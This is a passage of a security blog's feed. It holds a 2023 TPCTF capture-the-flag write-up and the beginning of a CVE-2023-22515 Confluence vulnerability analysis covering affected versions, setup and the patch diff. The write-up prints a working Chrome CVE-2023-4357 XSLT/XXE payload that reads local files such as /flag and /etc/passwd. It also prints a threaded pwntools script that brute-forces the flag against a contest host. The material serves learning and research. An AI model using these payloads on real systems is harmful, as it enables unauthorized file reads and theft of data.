c504226f3a7889737f6c277c0d97c38f2f931488da7d2c7e243526b2d7d0f99bdfac8a6ab4e2c4ee35dc3281fb6acb2bdd2ded50fb12b3e451b41cecfc5c2cc59b4b1454c762da4179f205dabc548f33dadd647068cc05adfc5d1674fb54e943672a6ac9fa1d2b33e38d3add5597d7feed1769e2a0167dabe1628bbe7070da00b375a3afca95f5a080dd5188563648e305bccd30f335d2d35062c40cfc03f07b19185488bde0f19c10b1ac9cbd815de13de119ad7ec20ffdf1528ea71ea541ea30306dccda3c168d2682c9059ee49c0ff91a5d49e09206f11d04df0fe890dca1044ea200cde7110047530b33662df89afa3322cbe25ebc4e281bc234a22d74a999cb6273026f4159baf02bdef55227849260a3f1b82a4e509839a5acd9ddb07c853b96d5f7dfc93bf458c1bb6d13a36dcc31a6b2a6aafd74ba31950ebd2a550f99f7ac5ec60893bbdabb5ce9afa444c240ab4d3fffb6cce978036952dfc533effebfb6c808ed6d306105b4d732008feec3218037591b8014ff9feb9f5adc372859e7ac3aca0a577d06dbbd8067a6eb35da8c3d40300a9058ea504dabadf0008b62ff1ded5aef7863af861d81d2a7d91be1c3a98d6bab90dd8d0e1413796b8d19159523a045981557d4fd179f16992296cd25f3ee54cef85fbe190adc895a33fd90441f142fd58fe69783a30ca148199ae845eee4acbea0f80022f6ae3119add84e4445e802fc2b0b1697411ab4977cb4667e63d8adba2d56f4be88a0101604c545adfc52bf5a60e9bd612ff25f2cc131b5d2ce8821c17edf5b265f81de898e45dc79d8acbb6a31df0b57890ba5ffed0d6668f15a0699f9b65943114c1cdf486b0f3462c4d1f39ded5f82d503444f7af3786a5421d547699710119b755f29720ba319e42958e6080c8c8e944b69f33df790ad9bd40351ea50b186ebfb4f65d153a89059a8202147d61c9d52cb6f3b189ebd5e71f9d2df78e6ec55017fd76f035f2ef0ef5c9384670ddfba40aa1c7ee78054c30e4aa31fe1aade470f81506448dbd359dfa79062e047e1b3431beb8a902564a7b5ff6595a0b0ce8dde29881c8c8488a4153fd8233ad396c3e962b7fbbed7675f81242e0a6e8381086896c7ffe8f3e2efd09650af7060c0ca73f5d6015d3ae28ee1a4a6af26f73c47bbc66b11244b3748ba58ef94997f92942aff0891101883610b7f2d0498597feb852fa27b4c8eb5b4c72a5f98241f8e0149bc1ba6e95154754097635a3926de8c71ebec825dadf6606e38531eec2f1407d1a5d3737c7de4e4ab5bccdbb879121e9d6eac6951a5e64ca450d00ae90202976105aa6eace248df7d88e05b792942248839aa658d47b2206bfedf60e19df117811923111af0f6870940bd6082c377e759e4f4f38cabdeecdb79a0abf862e733bcc94dba49b8785410dee9b4c6b2fe1dd75fc4b1f9961888ee896d76d1222eece426b81b219aa427756b2b22413e8443056a4efb4fdb677dfc2205c95aa85f290b620b58d467b6e7246e03f8cff05c8895199998ee4246b410fbcc104a62cb49f9f6dcf1d1c793ecbebeaf670c2ff4f13d003f03a9fdc63f7e00b623f25bb43d6752e1d5c645040572fa210ad8fd1effeb63337c7ca5db253d19a10870146b7373c0b40e1c6a8b915259cfea47f4cd6a43bdc27812cb322355019bf297150239e69f7d56a007cc0a85945b815fb3e425985c12ec6c930ef5842c5766e098f07433ecb3d9d767465bfebd62b2de47e3f3107ba3aae617d25fc8c148624aa052a773d89f0a3f10d48f9736b81f3c66e3d69b17af93cfad0f7d2afb5b7341fbd979a65b5cda0a88e52bbc9b758310be791dd93064cf77a3c7d9b4b3dbfb8c2ba02a273c24604bc6668f2be6b98c99d8b480f9a96e5aa3c4229193cbd1a2abdf054cddad1ba31cb0f1f71b2b3</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="CVE" scheme="https://drun1baby.github.io/categories/CVE/"/>
    
    
    <category term="CVE" scheme="https://drun1baby.github.io/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>2023 TPCTF WP</title>
    <link href="https://drun1baby.github.io/2023/11/28/2023-TPCTF-WP/"/>
    <id>https://drun1baby.github.io/2023/11/28/2023-TPCTF-WP/</id>
    <published>2023-11-28T07:36:15.000Z</published>
    <updated>2023-11-30T01:13:08.547Z</updated>
    
    <content type="html"><![CDATA[<ul><li>Nepnep yydsï¼</li></ul><h1 id="2023-TPCTF-WP"><a href="#2023-TPCTF-WP" class="headerlink" title="2023 TPCTF WP"></a>2023 TPCTF WP</h1><h2 id="xssbot-SOLVED-working-æ™šé£"><a href="#xssbot-SOLVED-working-æ™šé£" class="headerlink" title="xssbot | SOLVED | working : æ™šé£"></a>xssbot | SOLVED | working : æ™šé£</h2><p>çœ‹ç€åƒç”¨å‰å‡ å¤©çˆ†å‡ºæ¥çš„è¿™ä¸ªCVE-2023-4357æ¥ä»»æ„æ–‡ä»¶è¯»å–ï¼Œæœ¬åœ°å¤ç°ingâ€¦done!</p><p>payload</p><img src="/2023/11/28/2023-TPCTF-WP/web1.png" class><p>é­”æ”¹è‡ªï¼š<a class="link" href="https://github.com/xcanwin/CVE-2023-4357-Chrome-XXE">https://github.com/xcanwin/CVE-2023-4357-Chrome-XXE<i class="fas fa-external-link-alt"></i></a></p><img src="/2023/11/28/2023-TPCTF-WP/xxe.png" class><h2 id="Xssbot-but-no-Internet-SOLVED-working-LemonPrefectï¼Œæ™šé£"><a href="#Xssbot-but-no-Internet-SOLVED-working-LemonPrefectï¼Œæ™šé£" class="headerlink" title="Xssbot but no Internet | SOLVED | working : LemonPrefectï¼Œæ™šé£"></a>Xssbot but no Internet | SOLVED | working : LemonPrefectï¼Œæ™šé£</h2><p>BOT æ¥å—ä¸€ä¸ªæ–‡ä»¶å¹¶ä½¿ç”¨ Chrome æ— å¤´æµè§ˆå™¨è¿›è¡Œè®¿é—®ï¼Œæ ¹æ® Dockerfile å¯çŸ¥å…¶ flag ä½äº <code>/flag</code>ã€‚å› æ­¤ä½¿ç”¨æœ€è¿‘é‡Šå‡ºçš„é’ˆå¯¹ &lt;116.0.5845.96 ç‰ˆæœ¬ Chrome çš„ libxslt ä»»æ„æ–‡ä»¶åŒ…å«æ¼æ´å¤„ç†ã€‚</p><p>é»˜è®¤æƒ…å†µä¸‹ï¼ŒChrome å¯¹è·¨åŸŸåšäº†ä¸¥æ ¼çš„é™åˆ¶ï¼Œä½†é’ˆå¯¹äº XSL æ ·å¼è¡¨ä¸­åˆ©ç”¨ <code>document()</code> åŒ…å«çš„å¤–éƒ¨æ–‡ä»¶æ²¡æœ‰åšä¸¥æ ¼é™å®šã€‚å› æ­¤å¯ä»¥åˆ©ç”¨è¿™éƒ¨åˆ†è¿›è¡Œæ–‡ä»¶åŒ…å«ã€‚</p><blockquote><p><a class="link" href="https://github.com/xcanwin/CVE-2023-4357-Chrome-XXE">https://github.com/xcanwin/CVE-2023-4357-Chrome-XXE<i class="fas fa-external-link-alt"></i></a></p></blockquote><p>ç”±äºé¶æœºå¹¶ä¸èƒ½å‡ºç½‘ï¼Œæ‰€ä»¥æ— æ³•ç›´æ¥å‘èµ·è¯·æ±‚å¤–å¸¦å‡ºæ–‡ä»¶ã€‚åˆ†æ BOT çš„ä»£ç å‘ç°å…¶åœ¨ <code>driver.get</code> æ–¹æ³•ä¸­è®¿é—®ä¸Šä¼ çš„æ–‡ä»¶å¹¶ catch äº†æ‰€æœ‰é”™è¯¯ã€‚å› æ­¤å°è¯•ä½¿ <code>get</code> æ–¹æ³•äº§ç”Ÿå¼‚å¸¸ã€‚</p><p>æ­¤å¤„ä½¿ç”¨ä¸€ä¸ªè¶…é•¿çš„ url é‡å®šå‘ä½¿ Chrome å´©æºƒä»è€Œäº§ç”Ÿä¸€ä¸ª <code>selenium.common.exceptions.TimeoutException</code>ã€‚</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml-stylesheet type=<span class="string">&quot;text/xsl&quot;</span> href=<span class="string">&quot;?#&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">div</span> [</span></span><br><span class="line"><span class="meta">  &lt;!-- <span class="meta">&lt;!ENTITY <span class="keyword">passwd_p</span>        <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">passwd_c</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span> --&gt;</span></span><br><span class="line"><span class="meta">  &lt;!-- <span class="meta">&lt;!ENTITY <span class="keyword">sysini_p</span>        <span class="string">&quot;file:///c:/windows/system.ini&quot;</span>&gt;</span> --&gt;</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">sysini_c</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">xmlns:xsl</span>=<span class="string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">&quot;/&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:copy-of</span> <span class="attr">select</span>=<span class="string">&quot;document(&#x27;&#x27;)&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/1999/xhtml&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;display:none&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- &lt;p class=&quot;&amp;passwd_p;&quot;&gt;&amp;passwd_c;&lt;/p&gt; --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;flag&quot;</span>&gt;</span>&amp;sysini_c;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;width:40rem&quot;</span> <span class="attr">id</span>=<span class="string">&quot;r&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#r&#x27;</span>).<span class="property">innerHTML</span> = <span class="string">`</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">remote web url:    &amp;lt;textarea style=&quot;width:100%;height:1rem&quot;&gt;<span class="subst">$&#123;location.href&#125;</span>&amp;lt;/textarea&gt;&amp;lt;br/&gt;&amp;lt;br/&gt;`</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> text = <span class="string">&quot;&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;p&#x27;</span>).<span class="title function_">forEach</span>(<span class="function"><span class="params">p</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            flag = p.<span class="property">innerText</span></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span>(flag.<span class="title function_">startsWith</span>(<span class="string">&quot;LEMON_HIT_FLAG&quot;</span>))&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">var</span> total = <span class="number">0</span>;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &amp;lt; <span class="number">10000000000000</span>; i++)&#123;</span></span><br><span class="line"><span class="language-javascript">                    total += i.<span class="title function_">toString</span>();</span></span><br><span class="line"><span class="language-javascript">                    history.<span class="title function_">pushState</span>(<span class="number">0</span>, <span class="number">0</span>, total);</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">          <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#r&#x27;</span>).<span class="property">innerHTML</span> += <span class="string">`</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">local file path:   &amp;lt;textarea style=&quot;width:100%;height:1rem&quot;&gt;<span class="subst">$&#123; p.className &#125;</span>&amp;lt;/textarea&gt;&amp;lt;br/&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">local file content:&amp;lt;textarea style=&quot;width:100%;height:6rem&quot;&gt;<span class="subst">$&#123; p.innerHTML &#125;</span>&amp;lt;/textarea&gt;&amp;lt;br/&gt;&amp;lt;br/&gt;`</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript">        </span></span><br><span class="line"><span class="language-javascript">      </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>EXP</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">sem = threading.Semaphore(<span class="number">6</span>)</span><br><span class="line">now = <span class="string">&quot;TPCTF&#123;&quot;</span></span><br><span class="line">should_be_next = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">push</span>(<span class="params"><span class="built_in">slice</span>: <span class="built_in">str</span></span>):</span><br><span class="line">    <span class="keyword">global</span> now</span><br><span class="line">    <span class="keyword">global</span> should_be_next</span><br><span class="line">    now = <span class="built_in">slice</span></span><br><span class="line">    should_be_next = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">task</span>(<span class="params">attempt: <span class="built_in">str</span></span>):</span><br><span class="line">    <span class="keyword">global</span> now</span><br><span class="line">    <span class="keyword">global</span> should_be_next</span><br><span class="line">    sem.acquire()</span><br><span class="line">    <span class="keyword">if</span> should_be_next:</span><br><span class="line">        sem.release()</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    proc = remote(<span class="string">&quot;202.112.238.82&quot;</span>, <span class="string">&quot;23379&quot;</span>)</span><br><span class="line">    proc.sendlineafter(<span class="string">b&quot;File name:&quot;</span>, <span class="string">b&quot;lemon.svg&quot;</span>)</span><br><span class="line">    proc.sendafter(<span class="string">b&quot;Input your file:&quot;</span>, <span class="built_in">open</span>(</span><br><span class="line">        <span class="string">&quot;./test.svg&quot;</span>, <span class="string">&quot;rb&quot;</span>).read().replace(<span class="string">b&quot;LEMON_HIT_FLAG&quot;</span>, attempt.encode()))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] Trying <span class="subst">&#123;attempt&#125;</span>&quot;</span>)</span><br><span class="line">    proc.sendline(<span class="string">b&quot;EOF&quot;</span>)</span><br><span class="line">    proc.recvuntil(<span class="string">b&quot;Now browsing your website...\n&quot;</span>)</span><br><span class="line">    message = proc.recvline().decode().strip()</span><br><span class="line">    proc.close()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] Message: <span class="subst">&#123;message&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;ERROR&quot;</span> <span class="keyword">in</span> message:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] Tried `<span class="subst">&#123;attempt&#125;</span>&#x27; success as <span class="subst">&#123;message&#125;</span>.&quot;</span>)</span><br><span class="line">        push(attempt)</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&quot;Bye&quot;</span> <span class="keyword">in</span> message:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[x] Tried `<span class="subst">&#123;attempt&#125;</span>&#x27; failed as <span class="subst">&#123;message&#125;</span>.&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(message)</span><br><span class="line">    sem.release()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    alphabets = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz_-ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;&#123;&#125;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> now.endswith(<span class="string">&quot;&#125;&quot;</span>):</span><br><span class="line">        threads = []</span><br><span class="line">        should_be_next = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> alphabet <span class="keyword">in</span> alphabets:</span><br><span class="line">            attempt = now + alphabet</span><br><span class="line">            t = threading.Thread(target=task, args=(attempt,))</span><br><span class="line">            threads.append(t)</span><br><span class="line">            t.start()</span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">            t.join()</span><br><span class="line">        <span class="built_in">print</span>(now)</span><br></pre></td></tr></table></figure><img src="/2023/11/28/2023-TPCTF-WP/flag2.png" class><h2 id="walk-off-the-earth-SOLVED-working-So1ï¼ŒDrunkbabyï¼ŒLemonPrefect"><a href="#walk-off-the-earth-SOLVED-working-So1ï¼ŒDrunkbabyï¼ŒLemonPrefect" class="headerlink" title="walk off the earth | SOLVED| working : So1ï¼ŒDrunkbabyï¼ŒLemonPrefect"></a>walk off the earth | SOLVED| working : So1ï¼ŒDrunkbabyï¼ŒLemonPrefect</h2><p>åº”å‡ºé¢˜äººè¦æ±‚éšå» WP</p><img src="/2023/11/28/2023-TPCTF-WP/flag3.png" class><h2 id="walk-off-the-solar-system-SO1VED-working-Drunkbabyï¼ŒLemonPrefect"><a href="#walk-off-the-solar-system-SO1VED-working-Drunkbabyï¼ŒLemonPrefect" class="headerlink" title="walk off the solar system | SO1VED | working : Drunkbabyï¼ŒLemonPrefect"></a>walk off the solar system | SO1VED | working : Drunkbabyï¼ŒLemonPrefect</h2><p>è¯·å‚ç…§ walk off the earthï¼Œæ‰€ç”¨æ–¹æ³•å’Œè„šæœ¬éƒ½ä¸€è‡´ï¼Œåœ¨æ­¤ä¸å†èµ˜è¿°ã€‚</p><img src="/2023/11/28/2023-TPCTF-WP/flag4.png" class>]]></content>
    
    
    <summary type="html">2023 TPCTF WP</summary>
    
    
    
    <category term="WP" scheme="https://drun1baby.github.io/categories/WP/"/>
    
    
    <category term="WP" scheme="https://drun1baby.github.io/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2023-22515 Confluence RCE æ¼æ´åˆ†æ</title>
    <link href="https://drun1baby.github.io/2023/11/27/CVE-2023-22515-Confluence-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://drun1baby.github.io/2023/11/27/CVE-2023-22515-Confluence-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2023-11-27T01:48:04.000Z</published>
    <updated>2023-11-27T01:54:30.931Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVE-2023-22515-Confluence-RCE-æ¼æ´åˆ†æ"><a href="#CVE-2023-22515-Confluence-RCE-æ¼æ´åˆ†æ" class="headerlink" title="CVE-2023-22515 Confluence RCE æ¼æ´åˆ†æ"></a>CVE-2023-22515 Confluence RCE æ¼æ´åˆ†æ</h1><h2 id="0x01-æ¼æ´æè¿°"><a href="#0x01-æ¼æ´æè¿°" class="headerlink" title="0x01 æ¼æ´æè¿°"></a>0x01 æ¼æ´æè¿°</h2><p>Confluence æ˜¯ç”± Atlassian å¼€å‘çš„ä¼ä¸šçº§åä½œè½¯ä»¶ã€‚2023å¹´10æœˆï¼ŒAtlassian å®˜æ–¹æŠ«éœ² CVE-2023-22515 Atlassian Confluence Data Center &amp; Server æƒé™æå‡æ¼æ´ã€‚æ”»å‡»è€…å¯æ„é€ æ¶æ„è¯·æ±‚åˆ›å»ºç®¡ç†å‘˜ï¼Œä»è€Œç™»å½•ç³»ç»Ÿï¼Œé€ æˆæ•æ„Ÿä¿¡æ¯æ³„æ¼ç­‰ã€‚</p><p>å¦‚æœ Confluence ç«™ç‚¹æ‰˜ç®¡åœ¨ Atlassian Cloud(åŸŸåä¸ºï¼š<code>atlassian.net</code>)ï¼Œåˆ™ä¸å—æ­¤æ¼æ´å½±å“ã€‚</p><h2 id="0x02-å½±å“ç‰ˆæœ¬"><a href="#0x02-å½±å“ç‰ˆæœ¬" class="headerlink" title="0x02 å½±å“ç‰ˆæœ¬"></a>0x02 å½±å“ç‰ˆæœ¬</h2><p>8.0.0 - - 8.0.4<br>8.1.0 - - 8.1.4<br>8.2.0 - - 8.2.3<br>8.3.0 - - 8.3.2<br>8.4.0 - - 8.4.2<br>8.5.0 - - 8.5.1</p><h2 id="0x03-ç¯å¢ƒæ­å»º"><a href="#0x03-ç¯å¢ƒæ­å»º" class="headerlink" title="0x03 ç¯å¢ƒæ­å»º"></a>0x03 ç¯å¢ƒæ­å»º</h2><p>å®‰è£…åŒ… <a class="link" href="https://www.atlassian.com/software/confluence/download-archives">https://www.atlassian.com/software/confluence/download-archives<i class="fas fa-external-link-alt"></i></a></p><p>jar åŒ…ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://product-downloads.atlassian.com/software/confluence/downloads/atlassian-confluence-8.5.1.zip  </span><br><span class="line">https://product-downloads.atlassian.com/software/confluence/downloads/atlassian-confluence-8.5.2.zip</span><br></pre></td></tr></table></figure><p>å¤§è‡´çš„å®‰è£…å¯ä»¥çœ‹ <a class="link" href="https://cn-sec.com/archives/2177640.html">https://cn-sec.com/archives/2177640.html<i class="fas fa-external-link-alt"></i></a></p><p>å…¶ä¸­æœ‰ä¸€æ­¥æ•°æ®åº“çš„å®‰è£…ä¼šå­˜åœ¨ä¸€äº›é—®é¢˜ï¼Œé¦–å…ˆæ˜¯æ–°å»ºæ•°æ®åº“çš„æ—¶å€™ï¼Œå¯¹ç¼–ç æœ‰è¦æ±‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> DATABASE confluence <span class="type">CHARACTER</span> <span class="keyword">SET</span> utf8mb4 <span class="keyword">COLLATE</span> utf8mb4_bin;</span><br></pre></td></tr></table></figure><p>éšåæ˜¯è¿æ¥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:mysql://localhost/confluence?sessionVariables=transaction_isolation=<span class="string">&#x27;READ-COMMITTED&#x27;</span></span><br></pre></td></tr></table></figure><img src="/2023/11/27/CVE-2023-22515-Confluence-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/setupDatabase.png" class><p>åœ¨é…ç½®æ•°æ®åº“æ—¶éœ€è¦æŒ‡å®š <code>READ-COMMITTED</code></p><p>ä¸‹ä¸€æ­¥æ˜¯åšè°ƒè¯•å‡†å¤‡ï¼Œè¿™é‡Œçš„è°ƒè¯•éœ€è¦æ‰¾åˆ° Service</p><img src="/2023/11/27/CVE-2023-22515-Confluence-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/service.png" class><p>éšååœ¨ cmd é‡Œé¢è¿è¡Œè¿™ä¸€ä¸ªè¡Œå‘½ä»¤ï¼Œå°±ä¼šè·³å‡ºå¦‚å›¾æ‰€ç¤ºçš„æ¡†æ¡†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tomcat9w.exe //ES//Confluence151123100612</span><br></pre></td></tr></table></figure><p>éšåæ·»åŠ  JAVA_OPTSï¼Œè¿›è¡ŒåŠ¨è°ƒ</p><h2 id="0x04-æ¼æ´åˆ†æ"><a href="#0x04-æ¼æ´åˆ†æ" class="headerlink" title="0x04 æ¼æ´åˆ†æ"></a>0x04 æ¼æ´åˆ†æ</h2><p>æ ¹æ®å®˜æ–¹çš„å…¬å‘Šï¼Œä¿®å¤å»ºè®®æ˜¯ç»™ <code>/setup</code> æ‰“å¤´çš„æ¥å£åšé‰´æƒæ ¡éªŒ</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">security-constraint</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">web-resource-collection</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/setup/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">http-method-omission</span>&gt;</span>*<span class="tag">&lt;/<span class="name">http-method-omission</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-resource-collection</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">auth-constraint</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">security-constraint</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ç”±äº Confluence è¿™é‡Œçš„æ¡†æ¶æ˜¯åŸºäº S2 çš„ï¼ŒS2 çš„å¤§è‡´æµç¨‹å¦‚ su18 å¸ˆå‚…çš„å›¾æ‰€ç¤º</p><img src="/2023/11/27/CVE-2023-22515-Confluence-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/s2Route.png" class><p>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬ç°åœ¨éœ€è¦å»æ‰¾ä¸€ä¸‹ <code>/setup/*</code> æ¥å£æ˜¯æ€ä¹ˆè¢«å¤„ç†çš„ï¼Œç›´æ¥åˆ†ææ˜¯æ¯”è¾ƒéš¾çš„ï¼Œæ‰€ä»¥å…ˆ diff ä¸€ä¸‹ä»£ç ã€‚</p><ul><li><p>é¦–å…ˆ <code>struts2.xml</code> é‡Œé¢</p></li><li><p>ä¿®å¤ç‰ˆæœ¬æ–°å¢äº† <code>struts.override.acceptedPatterns</code></p></li><li><p>ä¿®å¤ç‰ˆæœ¬åˆ é™¤äº† <code>server-info action</code></p></li></ul><img src="/2023/11/27/CVE-2023-22515-Confluence-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/strutsXMLDiff.png" class><ul><li>æ¥ç€æ˜¯ <code>BootstapStatusProviderImpl</code> ç±»é‡Œé¢å¢åŠ äº†éƒ¨åˆ†å†…å®¹ï¼Œå¯¹å±æ€§ setupPersister å’Œ applicationConfig åšäº†é™åˆ¶</li></ul><img 